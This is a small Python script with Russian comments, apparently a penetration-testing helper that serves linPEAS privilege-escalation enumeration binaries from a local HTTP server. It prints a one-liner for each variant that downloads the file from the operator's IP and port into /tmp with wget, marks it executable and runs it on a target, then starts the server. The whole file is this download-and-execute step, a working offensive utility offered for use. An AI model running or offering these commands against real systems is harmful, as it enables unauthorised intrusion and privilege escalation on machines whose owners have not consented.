import subprocess
import argparse

# Парсер аргументов
parser = argparse.ArgumentParser(description="Python server file unloading")
parser.add_argument("-ip", "--ip", dest='sub_ip', help="IP address", default="127.0.0.1")
parser.add_argument("-p", "--port", dest='sub_port', help="Port", default="80", required=True)
options = parser.parse_args()

# Переменные
port = options.sub_port
ip = options.sub_ip

# Старт программы
print("Start PSFU - Python Server File Unloading")
print("--------------------------------------------------")

# Список файлов для загрузки
files = [
    "linpeas.sh",
    "linpeas_darwin_amd64",
    "linpeas_darwin_arm64",
    "linpeas_fat.sh",
    "linpeas_linux_386",
    "linpeas_linux_amd64",
    "linpeas_linux_arm",
    "linpeas_linux_arm64",
    "linpeas_small.sh",
]

# Генерация команд
for file in files:
    command = f"cd /tmp && wget http://{ip}:{port}/linux/{file} && chmod +x {file}  && ./{file}"
    print(command)
    print("--------------------------------------------------")

# Запуск HTTP-сервера
subprocess.run(["python3", "-m", "http.server", port])
